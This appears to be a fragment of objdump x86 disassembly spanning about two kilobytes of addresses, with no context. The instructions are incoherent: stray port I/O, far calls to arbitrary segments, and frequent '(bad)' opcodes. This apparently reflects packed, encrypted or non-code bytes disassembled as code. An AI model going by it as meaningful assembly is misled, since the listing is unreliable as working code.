  4176b5:	xchg   esi,eax
  4176b6:	fdivrp st(2),st
  4176b8:	add    WORD PTR [eax+eiz*2],cx
  4176bc:	fldcw  WORD PTR [ecx+0x596cb95e]
  4176c2:	push   0x29777b80
  4176c7:	icebp  
  4176c8:	imul   esp,DWORD PTR [edx+0x70336e5a],0x4556a0b2
  4176d2:	xor    BYTE PTR cs:[ecx+0x7aa16a4d],0x26
  4176da:	pop    esp
  4176db:	or     bl,BYTE PTR [ecx]
  4176dd:	or     al,0x57
  4176df:	inc    edi
  4176e0:	pop    esi
  4176e1:	jo     0x4176fc
  4176e3:	sbb    BYTE PTR [esi+eiz*2+0x6e],0x83
  4176e8:	fdiv   DWORD PTR [esi+edi*2+0x47eeb3a3]
  4176ef:	xchg   edi,eax
  4176f0:	test   DWORD PTR [ebp+0x37fe674c],esp
  4176f6:	push   ss
  4176f7:	addr16 fs pop ebp
  4176fa:	xchg   ecx,eax
  4176fb:	xor    al,0x3a
  4176fd:	cli    
  4176fe:	pop    ebx
  4176ff:	popf   
  417700:	push   ds
  417701:	cmp    DWORD PTR [ecx],ebx
  417703:	cli    
  417704:	add    al,0xbd
  417706:	int3   
  417707:	mov    al,ds:0x2ead98f2
  41770c:	fs mov al,0x8a
  41770f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417710:	jl     0x417756
  417712:	out    0xc3,eax
  417714:	aaa    
  417715:	bound  ebp,QWORD PTR ds:0xb92f4d01
  41771b:	nop
  41771c:	out    dx,al
  41771d:	sub    BYTE PTR [eax-0xc724e60],bl
  417723:	ds sahf 
  417725:	mov    dh,0x1
  417727:	clc    
  417728:	push   cs
  417729:	(bad)  
  41772a:	out    dx,al
  41772b:	int    0x58
  41772d:	inc    ecx
  41772e:	push   ecx
  41772f:	loopne 0x417761
  417731:	push   edx
  417732:	push   es
  417733:	mov    eax,ds:0x5be67259
  417738:	call   0xbaa3:0x5415c79b
  41773f:	sbb    BYTE PTR [ebx-0x611eaef8],bl
  417745:	lods   al,BYTE PTR ds:[esi]
  417746:	add    bh,ah
  417748:	outs   dx,DWORD PTR ds:[esi]
  417749:	pusha  
  41774a:	sub    al,0xe4
  41774c:	xchg   esp,eax
  41774d:	jo     0x417730
  41774f:	mov    edx,0xc6de4500
  417754:	pop    esi
  417755:	jbe    0x4177b3
  417757:	sub    DWORD PTR ds:0xe91b99a3,ebx
  41775d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41775e:	in     eax,dx
  41775f:	mov    al,ds:0x9add9f69
  417764:	ret    0x9cfb
  417767:	dec    esi
  417768:	in     al,dx
  417769:	dec    esi
  41776a:	out    dx,al
  41776b:	adc    ebp,0x1cd43e6a
  417771:	xchg   DWORD PTR [esi+eiz*2+0x21723108],edx
  417778:	xor    BYTE PTR [edi+0x365de7b4],bl
  41777e:	cmp    DWORD PTR [ebx-0x8],0x862e3929
  417785:	out    0xb0,al
  417787:	mov    al,ds:0xa21e112
  41778c:	out    0xf2,al
  41778e:	cwde   
  41778f:	popf   
  417790:	pop    esi
  417791:	sbb    bl,0x86
  417794:	dec    ebp
  417795:	lock fbld TBYTE PTR [ebx]
  417798:	push   0x5f69e6ca
  41779d:	test   al,0xef
  41779f:	mov    dl,0x5a
  4177a1:	pop    ss
  4177a2:	mov    esi,0x8f78f628
  4177a7:	mov    ds:0x647ee8c0,al
  4177ac:	stc    
  4177ad:	test   DWORD PTR [ebx+0x75],edx
  4177b0:	loop   0x417820
  4177b2:	ficomp WORD PTR [ecx-0x11ee43a2]
  4177b8:	loopne 0x41774b
  4177ba:	jg     0x41773d
  4177bc:	pop    ebx
  4177bd:	popa   
  4177be:	out    0xb6,al
  4177c0:	mov    ch,0x7
  4177c2:	arpl   WORD PTR [edx],di
  4177c4:	mov    ebp,0xde0bf3f9
  4177c9:	or     DWORD PTR [edx],0x536d2324
  4177cf:	xor    DWORD PTR [esi-0x535efdc9],eax
  4177d5:	sub    eax,0x2d09a728
  4177da:	pop    ecx
  4177db:	add    ebx,DWORD PTR [edi-0x6e]
  4177de:	call   0x9868:0xd1d2d3e8
  4177e5:	je     0x4177a2
  4177e7:	mov    al,ds:0xe3d7540a
  4177ec:	mov    esp,0x5e81f585
  4177f1:	loop   0x417804
  4177f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177f4:	dec    ecx
  4177f5:	pop    esp
  4177f6:	popa   
  4177f7:	xchg   edx,eax
  4177f8:	xchg   ebp,eax
  4177f9:	das    
  4177fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177fb:	mul    BYTE PTR [eax]
  4177fd:	popa   
  4177fe:	lock add ecx,edx
  417801:	and    eax,0xf3342d68
  417806:	out    dx,al
  417807:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417808:	mov    bl,0xd
  41780a:	pop    esp
  41780b:	cld    
  41780c:	or     esp,ebx
  41780e:	cpuid  
  417810:	mov    ?,WORD PTR [esi+0x69ed9b95]
  417816:	or     bl,BYTE PTR [esi+esi*4+0x4]
  41781a:	and    eax,0x2ff55fc9
  41781f:	jmp    0x415dc0cf
  417824:	adc    DWORD PTR [edx],0x3296a118
  41782a:	mov    esp,0x544750f9
  41782f:	mov    ebx,0xf316d85e
  417834:	mov    dh,0xdd
  417836:	loop   0x4177fe
  417838:	leave  
  417839:	pop    esp
  41783a:	in     al,0x87
  41783c:	lods   eax,DWORD PTR ds:[esi]
  41783d:	sahf   
  41783e:	add    DWORD PTR [ebp+0x1],esp
  417841:	loope  0x4177d3
  417843:	clc    
  417844:	imul   esi,DWORD PTR [edx-0x11],0xf0c2f3df
  41784b:	add    BYTE PTR [ebx],dh
  41784d:	in     al,dx
  41784e:	aam    0x29
  417850:	adc    BYTE PTR [ecx+0x5a],ah
  417853:	out    0x59,al
  417855:	push   eax
  417856:	sub    eax,0xee07b84e
  41785b:	outs   dx,DWORD PTR ds:[esi]
  41785c:	popa   
  41785d:	or     al,0x12
  41785f:	jl     0x4177f0
  417861:	pop    ecx
  417862:	inc    esp
  417863:	mov    eax,ds:0x1af708af
  417868:	mov    ecx,0xeaf8bcb8
  41786d:	inc    ebp
  41786e:	out    dx,al
  41786f:	adc    DWORD PTR [edi],edi
  417871:	gs call 0x2dae:0x1b3b2253
  417879:	mov    eax,0xbefb6bf0
  41787e:	scas   al,BYTE PTR es:[edi]
  41787f:	mov    edi,0x32859ec9
  417884:	pop    ebx
  417885:	sub    dh,dh
  417887:	lock or ebx,ebp
  41788a:	lods   eax,DWORD PTR ds:[esi]
  41788b:	dec    esi
  41788c:	lea    esi,ds:0xc06fe162
  417892:	loope  0x417834
  417894:	sub    esp,DWORD PTR [edx]
  417896:	aam    0x6e
  417898:	(bad)  [esi+0x36]
  41789b:	js     0x4178fb
  41789d:	pop    es
  41789e:	leave  
  41789f:	pop    ss
  4178a0:	cdq    
  4178a1:	sbb    al,0xf3
  4178a3:	sti    
  4178a4:	nop
  4178a5:	pusha  
  4178a6:	dec    ebx
  4178a7:	xor    ebx,DWORD PTR [edi-0x1be6e68e]
  4178ad:	cli    
  4178ae:	out    dx,al
  4178af:	imul   edx
  4178b1:	pop    ebx
  4178b2:	test   eax,0xf61ecef3
  4178b7:	test   al,0xcb
  4178b9:	push   ecx
  4178ba:	add    edi,esp
  4178bc:	push   ecx
  4178bd:	cmp    DWORD PTR [eax+eiz*2+0x47517f8d],0xffffffc3
  4178c5:	out    dx,eax
  4178c6:	out    dx,al
  4178c7:	sbb    al,BYTE PTR [bx+di+0x4b7]
  4178cc:	mul    DWORD PTR [edx-0x69]
  4178cf:	(bad)  
  4178d0:	mov    ah,0x7
  4178d2:	mov    ch,0xe0
  4178d4:	jns    0x417952
  4178d6:	mov    ah,0x45
  4178d8:	xchg   ecx,eax
  4178d9:	hlt    
  4178da:	dec    ecx
  4178db:	dec    ebp
  4178dc:	ss call 0x43b6:0xb30d78ed
  4178e4:	dec    ecx
  4178e5:	mov    ch,0x66
  4178e7:	ins    DWORD PTR es:[edi],dx
  4178e8:	cmp    esp,DWORD PTR [ecx-0xd]
  4178eb:	into   
  4178ec:	xchg   ebp,eax
  4178ed:	mov    WORD PTR [ebx-0x11d80352],gs
  4178f3:	xchg   edx,eax
  4178f4:	sub    ebp,0xfffffff2
  4178f7:	retf   0x219b
  4178fa:	xchg   ebx,eax
  4178fb:	mov    eax,ds:0x77bd94a8
  417900:	adc    BYTE PTR [esi+ebp*1],bl
  417903:	icebp  
  417904:	pusha  
  417905:	ja     0x417942
  417907:	out    0x9d,eax
  417909:	(bad)  
  41790a:	hlt    
  41790b:	loopne 0x417969
  41790d:	add    al,0xca
  41790f:	fsub   QWORD PTR [ecx-0x3]
  417912:	out    dx,al
  417913:	sub    DWORD PTR [ebp-0x284e845d],ebp
  417919:	lods   al,BYTE PTR ds:[esi]
  41791a:	out    dx,al
  41791b:	cli    
  41791c:	mov    ebp,DWORD PTR [ebx]
  41791e:	fstp   TBYTE PTR [ecx-0x5f150197]
  417924:	xor    dh,BYTE PTR [ecx-0x68ef122e]
  41792a:	mov    ds:0xc0365e4c,eax
  41792f:	outs   dx,DWORD PTR ds:[esi]
  417930:	js     0x4179b1
  417932:	mov    ah,0x44
  417934:	and    al,0xa3
  417936:	cmp    DWORD PTR [ecx-0x682a6800],esp
  41793c:	hlt    
  41793d:	xor    cl,dh
  41793f:	dec    edi
  417940:	pop    esi
  417941:	stc    
  417942:	pop    edx
  417943:	(bad)  
  417944:	jge    0x417957
  417946:	out    0xfc,al
  417948:	outs   dx,DWORD PTR ds:[esi]
  417949:	pusha  
  41794a:	adc    eax,0x1cebfa06
  41794f:	jbe    0x4178ea
  417951:	es fs mov esp,0xdf0b195d
  417958:	mov    bl,0x10
  41795a:	add    al,0x52
  41795c:	adc    BYTE PTR [ebp+0x74],0xab
  417960:	test   eax,0x57aceee8
  417965:	cwde   
  417966:	and    eax,0xeed0e117
  41796b:	rcr    edi,1
  41796d:	add    eax,0xd1b14b24
  417972:	sbb    DWORD PTR [ecx],edx
  417974:	punpcklwd mm3,DWORD PTR [ebp-0x3d28c19]
  41797b:	adc    al,0xa1
  41797d:	stos   DWORD PTR es:[edi],eax
  41797e:	call   0xedca1593
  417983:	xchg   esi,eax
  417984:	nop
  417985:	pusha  
  417986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417987:	je     0x41793e
  417989:	mov    eax,0xce52cd04
  41798e:	out    0x59,eax
  417990:	pop    es
  417991:	push   ebx
  417992:	and    bh,BYTE PTR ds:0x841282ee
  417998:	lahf   
  417999:	pop    edi
  41799a:	push   ss
  41799b:	push   edi
  41799c:	cdq    
  41799d:	xor    al,0x7
  41799f:	adc    BYTE PTR [edx+0x5e501480],bh
  4179a5:	jae    0x417929
  4179a7:	js     0x417996
  4179a9:	xchg   ebx,eax
  4179aa:	shl    ch,0xc0
  4179ad:	mov    esi,0x8be7a516
  4179b2:	out    dx,eax
  4179b3:	and    eax,0xa720a0a8
  4179b8:	xchg   edi,eax
  4179b9:	iret   
  4179ba:	jmp    0x4179e7
  4179bc:	sbb    cl,BYTE PTR [edi-0x2a05f5f9]
  4179c2:	out    0x18,al
  4179c4:	cld    
  4179c5:	push   ds
  4179c6:	dec    edx
  4179c7:	scas   al,BYTE PTR es:[edi]
  4179c8:	push   ecx
  4179c9:	lock out dx,al
  4179cb:	ror    DWORD PTR [esi+0x7eae1a1b],0x56
  4179d2:	es nop ecx
  4179d6:	rol    BYTE PTR [ebx],1
  4179d8:	and    DWORD PTR [ecx+ecx*2-0xb],edi
  4179dc:	(bad)  
  4179dd:	pusha  
  4179de:	lock call 0x889cb021
  4179e4:	or     DWORD PTR [ebx-0x29e8c615],ebp
  4179ea:	jl     0x417a42
  4179ec:	out    dx,eax
  4179ed:	nop
  4179ee:	(bad)  
  4179f0:	ins    DWORD PTR es:[edi],dx
  4179f1:	inc    ebx
  4179f2:	xor    BYTE PTR gs:[edi-0x20],bl
  4179f6:	cdq    
  4179f7:	mov    ah,ch
  4179f9:	les    ebx,FWORD PTR [edx+0x21]
  4179fc:	xchg   BYTE PTR [ecx],ah
  4179fe:	xor    BYTE PTR [edi],ch
  417a00:	out    dx,al
  417a01:	sbb    al,0xa9
  417a03:	je     0x417a3e
  417a05:	popa   
  417a06:	jg     0x417a48
  417a08:	xchg   edi,eax
  417a09:	jle    0x417997
  417a0b:	fisub  DWORD PTR [ebp+0x77fd251a]
  417a11:	loopne 0x417a49
  417a13:	bound  esi,QWORD PTR [eax+0x12f2c09c]
  417a19:	popa   
  417a1a:	mov    dl,0x94
  417a1c:	xchg   DWORD PTR [eax-0x1938ed6e],esi
  417a22:	out    dx,al
  417a23:	(bad)  
  417a24:	out    0x9e,al
  417a26:	xor    eax,0x7fbcd1b7
  417a2b:	mov    eax,ds:0x860fba94
  417a30:	test   al,0x47
  417a32:	lods   al,BYTE PTR ds:[esi]
  417a33:	jmp    0x417aa7
  417a35:	loope  0x417a25
  417a37:	shr    DWORD PTR [ecx],0xcd
  417a3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a3b:	jo     0x417a0b
  417a3d:	cmp    BYTE PTR [eax],bl
  417a3f:	mov    eax,ds:0x54f53069
  417a44:	popf   
  417a45:	bound  ecx,QWORD PTR [edi-0x32]
  417a48:	inc    esp
  417a49:	dec    eax
  417a4a:	mov    ebp,0xc6d45e63
  417a4f:	aad    0x25
  417a51:	jmp    DWORD PTR [ebp-0x5f]
  417a54:	sub    BYTE PTR [esi-0x80],0xfb
  417a58:	(bad)  
  417a59:	hlt    
  417a5a:	test   DWORD PTR [esi-0x7c],0x144dee82
  417a61:	adc    ebp,DWORD PTR [ecx-0x3107f3d]
  417a67:	mov    al,ds:0xfd38934e
  417a6c:	jecxz  0x417a32
  417a6e:	jl     0x417a8d
  417a70:	pop    esi
  417a71:	sub    eax,0x88041999
  417a76:	jmp    ecx
  417a78:	sbb    DWORD PTR [ecx-0x4d],esp
  417a7b:	sub    DWORD PTR ds:0xf05ff6ba,ecx
  417a81:	lea    esp,[esi]
  417a83:	sub    ecx,DWORD PTR [eax+0x61]
  417a86:	(bad)  
  417a87:	and    ch,BYTE PTR [esi-0x371d4509]
  417a8d:	and    al,0x99
  417a8f:	mov    ds:0x7031c375,al
  417a94:	push   eax
  417a95:	mov    ecx,0xdb937d72
  417a9a:	out    dx,al
  417a9b:	adc    BYTE PTR [edx+0x53a58aa8],cl
  417aa1:	and    ebx,ebx
  417aa3:	pop    esi
  417aa4:	mov    al,0xf4
  417aa6:	shl    BYTE PTR cs:[ecx+0x28],1
  417aaa:	mov    esi,0xeb0ff66e
  417aaf:	out    0xe9,al
  417ab1:	loop   0x417a86
  417ab3:	and    DWORD PTR [ecx-0x30],ebp
  417ab6:	adc    eax,0x7f6151b8
  417abb:	pop    esp
  417abc:	or     esi,DWORD PTR [esi+0x2b5b51a2]
  417ac2:	jmp    0x417a9a
  417ac4:	cs mov ebx,0xf996abc8
  417aca:	pop    esi
  417acb:	xchg   esp,eax
  417acc:	mov    esi,0x3ba0a764
  417ad1:	or     DWORD PTR [ebp+0x5038b0a9],esi
  417ad7:	push   esi
  417ad8:	pop    esi
  417ad9:	shl    BYTE PTR [ecx+0x3533d3ae],cl
  417adf:	push   eax
  417ae0:	cmp    BYTE PTR [ebp+esi*8+0x46edb2a0],0x59
  417ae8:	xor    dh,BYTE PTR [edi]
  417aea:	shr    ah,1
  417aec:	pop    esi
  417aed:	ins    BYTE PTR es:[edi],dx
  417aee:	call   0x9222:0x7333c1c2
  417af5:	pop    ecx
  417af6:	nop
  417af7:	cmc    
  417af8:	cmp    DWORD PTR [ebx-0x7edccee1],edx
  417afe:	dec    eax
  417aff:	gs pop esi
  417b01:	imul   esi,DWORD PTR ds:0x6782ac63,0x1a
  417b08:	sahf   
  417b09:	pusha  
  417b0a:	outs   dx,DWORD PTR ds:[esi]
  417b0b:	stc    
  417b0c:	(bad)  
  417b0d:	fcom   DWORD PTR [esi+ebp*2]
  417b10:	in     eax,dx
  417b11:	dec    edx
  417b12:	out    dx,al
  417b13:	jp     0x417a97
  417b15:	push   ecx
  417b16:	aas    
  417b17:	imul   edx,DWORD PTR [ebx],0xffffff81
  417b1a:	aad    0x6a
  417b1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b1d:	push   edi
  417b1e:	jl     0x417b27
  417b20:	mov    eax,0x8aa7c123
  417b25:	sbb    cl,BYTE PTR [esi-0x4c8dd7bd]
  417b2b:	int3   
  417b2c:	in     al,0xc2
  417b2e:	out    dx,al
  417b2f:	inc    eax
  417b30:	gs stos BYTE PTR es:[edi],al
  417b32:	jl     0x417b55
  417b34:	stc    
  417b35:	sbb    bh,ah
  417b37:	sar    BYTE PTR [edx+0x5d],cl
  417b3a:	dec    esp
  417b3b:	leave  
  417b3c:	scas   eax,DWORD PTR es:[edi]
  417b3d:	or     edi,ebp
  417b3f:	pop    eax
  417b40:	mov    ch,0x93
  417b42:	cli    
  417b43:	xchg   esp,eax
  417b44:	cwde   
  417b45:	push   ebx
  417b46:	add    bl,BYTE PTR [edi+0x5e]
  417b49:	sbb    DWORD PTR [eax+edx*4],0xa
  417b4d:	int    0xcf
  417b4f:	gs pop esi
  417b51:	cld    
  417b52:	push   edi
  417b53:	fisttp DWORD PTR [edi-0x28]
  417b56:	and    bl,dh
  417b58:	call   0x3ff8:0xb5ff360
  417b5f:	push   0x39
  417b61:	imul   ebp,esi,0xa2d23c86
  417b67:	jl     0x417bb0
  417b69:	adc    bl,BYTE PTR [edi+0x24be628d]
  417b6f:	cmovp  esp,DWORD PTR [ecx-0x69]
  417b73:	push   ds
  417b74:	popf   
  417b75:	push   esi
  417b76:	in     al,0x86
  417b78:	pop    esi
  417b79:	mov    al,0xb2
  417b7b:	dec    ecx
  417b7c:	cmc    
  417b7d:	mov    esp,0x609fb653
  417b82:	loopne 0x417b42
  417b84:	ins    BYTE PTR es:[edi],dx
  417b85:	in     eax,0xc0
  417b87:	stc    
  417b88:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  417b8a:	repz imul esp,DWORD PTR [ebp+0x2e],0x46
  417b8f:	and    DWORD PTR [ecx-0x33e5403c],ebp
  417b95:	pusha  
  417b96:	daa    
  417b97:	dec    eax
  417b98:	icebp  
  417b99:	inc    ebx
  417b9a:	dec    edi
  417b9b:	push   eax
  417b9c:	pop    ss
  417b9d:	(bad)  
  417b9e:	out    dx,al
  417b9f:	add    esi,esi
  417ba1:	lea    eax,[eax-0x2ac06832]
  417ba7:	mov    eax,ds:0x5d350687
  417bac:	xchg   esi,eax
  417bad:	sbb    DWORD PTR [edx+0x5d],eax
  417bb0:	test   eax,eax
  417bb2:	add    dl,BYTE PTR [ecx+0xd]
  417bb5:	(bad)  
  417bb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bb7:	imul   ah
  417bb9:	sbb    al,0xe7
  417bbb:	stc    
  417bbc:	je     0x417bf8
  417bbe:	(bad)  
  417bbf:	mov    dl,0x24
  417bc1:	push   edx
  417bc2:	adc    eax,0x24371e4f
  417bc7:	push   0xffffff97
  417bc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bca:	xor    eax,0x502d10a1
  417bcf:	xchg   ecx,eax
  417bd0:	and    al,ah
  417bd2:	outs   dx,DWORD PTR ds:[esi]
  417bd3:	mov    ecx,0x8d53805e
  417bd8:	aad    0x2f
  417bda:	push   ecx
  417bdb:	ins    BYTE PTR es:[edi],dx
  417bdc:	out    dx,eax
  417bdd:	pusha  
  417bde:	mov    ecx,0xf5a83e23
  417be3:	jne    0x417bdf
  417be5:	add    dh,ah
  417be7:	xor    DWORD PTR [edx-0x63],edx
  417bea:	dec    ecx
  417beb:	test   cl,dh
  417bed:	inc    ecx
  417bee:	scas   al,BYTE PTR es:[edi]
  417bef:	jp     0x417c0f
  417bf1:	and    eax,0x5f381a01
  417bf6:	mov    eax,ds:0xb020a1
  417bfb:	mov    cl,0x17
  417bfd:	adc    bl,cl
  417bff:	add    al,0x5e
  417c01:	cld    
  417c02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c03:	out    dx,eax
  417c04:	icebp  
  417c05:	sub    BYTE PTR [ebx-0x659f8e2a],dh
  417c0b:	scas   al,BYTE PTR es:[edi]
  417c0c:	leave  
  417c0d:	sbb    BYTE PTR [ecx+0x4e01cbef],bl
  417c13:	xchg   ebp,eax
  417c14:	clc    
  417c15:	sub    ebx,ebp
  417c17:	jecxz  0x417c3d
  417c19:	xor    ax,0xb4a9
  417c1d:	mov    ah,0x6e
  417c1f:	lds    edx,FWORD PTR [edi+0x1d9f4b23]
  417c25:	js     0x417be5
  417c27:	cmp    DWORD PTR [esi+0x6bbe9c2f],ebx
  417c2d:	mov    edx,0x706ec7ee
  417c32:	(bad)  
  417c33:	xor    BYTE PTR ds:0x1da88c5b,cl
  417c39:	lahf   
  417c3a:	fadd   DWORD PTR [ebp-0x3a]
  417c3d:	rcl    BYTE PTR [eax-0x1137ba62],0x49
  417c44:	mov    cl,0xff
  417c46:	js     0x417bd7
  417c48:	adc    eax,0x6ca0a857
  417c4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c4e:	call   0xc038b7aa
  417c53:	js     0x417cb9
  417c55:	mov    esp,DWORD PTR [ecx+0x3ce10ca4]
  417c5b:	into   
  417c5c:	std    
  417c5d:	loope  0x417c7b
  417c5f:	mov    eax,ds:0x40a47716
  417c64:	add    ecx,DWORD PTR [ecx-0x68]
  417c67:	mov    edx,0x86f285e
  417c6c:	mov    dh,bl
  417c6e:	fiadd  DWORD PTR [edi+0x44]
  417c71:	mov    ds:0xeedfa147,eax
  417c76:	sbb    eax,DWORD PTR [edx+ecx*4+0x26]
  417c7a:	pop    ebx
  417c7b:	out    0x64,eax
  417c7d:	add    ebp,DWORD PTR fs:[eax]
  417c80:	inc    edi
  417c81:	loope  0x417c9b
  417c83:	dec    esp
  417c84:	pop    ss
  417c85:	sub    al,0x6f
  417c87:	mov    eax,ds:0xb13755d8
  417c8c:	jne    0x417c87
  417c8e:	mov    ebp,0x6bd5e83
  417c93:	fisub  DWORD PTR [ecx]
  417c95:	xchg   esp,eax
  417c96:	dec    edi
  417c97:	or     DWORD PTR [eax+eiz*2+0x6dc91b04],esp
  417c9e:	dec    esp
  417c9f:	mov    dl,0xc6
  417ca1:	outs   dx,BYTE PTR ds:[esi]
  417ca2:	out    dx,al
  417ca3:	std    
  417ca4:	mov    ?,edi
  417ca6:	jmp    0x417c92
  417ca8:	or     DWORD PTR [eax+0x34],eax
  417cab:	mov    eax,ds:0xb314f58
  417cb0:	cdq    
  417cb1:	jp     0x417c78
  417cb3:	mov    ch,0x5e
  417cb5:	lods   eax,DWORD PTR ds:[esi]
  417cb6:	in     al,dx
  417cb7:	push   ebx
  417cb8:	dec    edi
  417cb9:	dec    ebx
  417cba:	sub    eax,0x34395ed
  417cbf:	ret    
  417cc0:	mov    ds:0xc00d125d,eax
  417cc5:	sti    
  417cc6:	cmp    ebp,DWORD PTR [eax]
  417cc8:	mov    esi,0x5d409f21
  417ccd:	pop    eax
  417cce:	into   
  417ccf:	js     0x417d07
  417cd1:	cdq    
  417cd2:	dec    eax
  417cd3:	add    al,0x1e
  417cd5:	mov    ds:0x613020b4,eax
  417cda:	mov    dh,0x53
  417cdc:	ins    BYTE PTR es:[edi],dx
  417cdd:	dec    esp
  417cde:	stc    
  417cdf:	cmp    DWORD PTR [edx+0xc43ee32],ecx
  417ce5:	mov    bh,0x98
  417ce7:	xchg   ebx,eax
  417ce8:	bound  eax,QWORD PTR [ebp+0xb]
  417ceb:	mov    eax,ds:0xab1d4695
  417cf0:	hlt    
  417cf1:	lds    eax,FWORD PTR [eax]
  417cf3:	pushf  
  417cf4:	pop    esi
  417cf5:	loop   0x417d35
  417cf7:	add    DWORD PTR [ecx+0x254e9bde],edi
  417cfd:	push   edx
  417cfe:	in     eax,0x19
  417d00:	loop   0x417cb4
  417d02:	lods   eax,DWORD PTR ds:[esi]
  417d03:	cli    
  417d04:	lds    edi,FWORD PTR [esp+ecx*8-0x10baa47c]
  417d0b:	cmp    ecx,DWORD PTR ds:0x29611bca
  417d11:	push   ebx
  417d12:	fistp  DWORD PTR [edi+0x3b]
  417d15:	fs cdq 
  417d17:	ins    BYTE PTR es:[edi],dx
  417d18:	xor    DWORD PTR [esi+0x69],edi
  417d1b:	cmp    bl,0xf4
  417d1e:	adc    eax,0x984add40
  417d23:	inc    eax
  417d24:	xchg   BYTE PTR [edx+0x1170a11c],dh
  417d2a:	xchg   esp,eax
  417d2b:	mov    ecx,edx
  417d2d:	mov    bl,0xc7
  417d2f:	or     ebx,DWORD PTR [ebp+0x36]
  417d32:	out    dx,eax
  417d33:	loopne 0x417cf5
  417d35:	cmp    eax,0xa892124c
  417d3a:	and    BYTE PTR [esi-0xc0deb82],0xa0
  417d41:	mov    al,ds:0xacdbaf25
  417d46:	add    BYTE PTR [ebx-0x1591bb06],cl
  417d4c:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  417d4e:	xor    al,0x62
  417d50:	push   esi
  417d51:	popa   
  417d52:	sub    al,0xd5
  417d54:	add    DWORD PTR [ebx-0x5f],edi
  417d57:	(bad)  
  417d58:	scas   al,BYTE PTR es:[edi]
  417d59:	outs   dx,BYTE PTR ds:[esi]
  417d5a:	out    dx,al
  417d5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d5c:	out    dx,eax
  417d5d:	jo     0x417dad
  417d5f:	sbb    ebx,DWORD PTR [eax-0x6d]
  417d62:	or     esp,DWORD PTR [edx+0x7fe4de38]
  417d68:	(bad)  
  417d69:	cmp    al,0x98
  417d6b:	dec    ecx
  417d6c:	mov    esi,0x7260eef3
  417d71:	xor    eax,0xa441b89c
  417d76:	ret    
  417d77:	mov    al,ds:0xce96aaf4
  417d7c:	jne    0x417d3d
  417d7e:	not    ecx
  417d80:	pop    esi
  417d81:	test   DWORD PTR [ebp+eiz*2+0x8d7c564],ecx
  417d88:	test   DWORD PTR [eax],esi
  417d8a:	stos   BYTE PTR es:[edi],al
  417d8b:	mov    al,ds:0x5b06ca3c
  417d90:	fsub   DWORD PTR [ebx+eiz*1-0x47]
  417d94:	js     0x417daa
  417d96:	out    dx,al
  417d97:	mov    WORD PTR [eax-0x24f80497],ss
  417d9d:	outs   dx,BYTE PTR ds:[esi]
  417d9e:	clc    
  417d9f:	jl     0x417d42
  417da1:	pusha  
  417da2:	xchg   bx,ax
  417da4:	or     al,0x42
  417da6:	sub    DWORD PTR [ecx-0x61112849],ecx
  417dac:	out    0x80,eax
  417dae:	(bad)  
  417daf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417db0:	mov    bl,0xe0
  417db2:	sbb    eax,0x1396c1a1
  417db7:	std    
  417db8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db9:	jb     0x417de6
  417dbb:	xor    eax,0x1609b15e
  417dc0:	pop    edx
  417dc1:	sub    BYTE PTR [ebx+0x43ad196d],0x90
  417dc8:	cdq    
  417dc9:	shl    BYTE PTR [ecx-0x1e5dfe5f],cl
  417dcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dd0:	push   0x4da3ecb2
  417dd5:	dec    esp
  417dd6:	jl     0x417d76
  417dd8:	mov    bh,0xc0
  417dda:	mov    esi,ebp
  417ddc:	rcl    DWORD PTR [edx-0x2d],0xe1
  417de0:	fmul   QWORD PTR [esi+ebp*8-0x22]
  417de4:	adc    esp,DWORD PTR [edx+esi*4+0x4]
  417de8:	pop    esi
  417de9:	mov    ds:0x84b9574a,eax
  417dee:	cmp    eax,0xd560b24e
  417df3:	neg    DWORD PTR [eax]
  417df5:	push   esp
  417df6:	mov    al,ds:0xee0b63bc
  417dfb:	daa    
  417dfc:	xchg   edi,eax
  417dfd:	retf   0x88ce
  417e00:	mul    BYTE PTR [edx]
  417e02:	push   edi
  417e03:	mov    eax,ds:0xeffedac
  417e08:	xchg   ecx,eax
  417e09:	add    BYTE PTR [esi-0x7a],cl
  417e0c:	pop    ebx
  417e0d:	xor    BYTE PTR [edi-0x68],ah
  417e10:	add    eax,0x29b57ed4
  417e15:	shr    BYTE PTR [ecx+eiz*4+0x5f],cl
  417e19:	pop    ds
  417e1a:	scas   eax,DWORD PTR es:[edi]
  417e1b:	(bad)  
  417e1c:	test   DWORD PTR [ebx+esi*8-0x31],0xb793285e
  417e24:	xchg   ebx,eax
  417e25:	add    ah,BYTE PTR [edi]
  417e27:	dec    edx
  417e28:	sub    eax,0xfee31b58
  417e2d:	xor    eax,0x65d83cee
  417e32:	je     0x417e79
  417e34:	pop    esi
  417e35:	das    
  417e36:	sub    BYTE PTR [edx],al
  417e38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e39:	dec    esp
  417e3a:	push   es
  417e3b:	jg     0x417dbd
  417e3d:	pusha  
  417e3e:	jp     0x417eae
  417e40:	daa    
  417e41:	mov    ah,0xbf
  417e43:	or     al,0xcc
  417e45:	sub    eax,0x9b548e56
  417e4a:	ins    DWORD PTR es:[edi],dx
  417e4b:	ds mov dh,ch
  417e4e:	inc    edi
  417e4f:	mov    al,ds:0x6108c8dc
  417e54:	mov    dl,0x5a
  417e56:	pop    ecx
  417e57:	sub    dh,ah
  417e59:	pusha  
  417e5a:	or     dh,BYTE PTR [esi-0x4f86face]
  417e60:	xchg   ecx,eax
  417e61:	es out dx,al
  417e63:	jmp    0x4b0926b
  417e68:	push   ds
  417e69:	push   ss
  417e6a:	into   
  417e6b:	xchg   esi,eax
  417e6c:	pop    ss
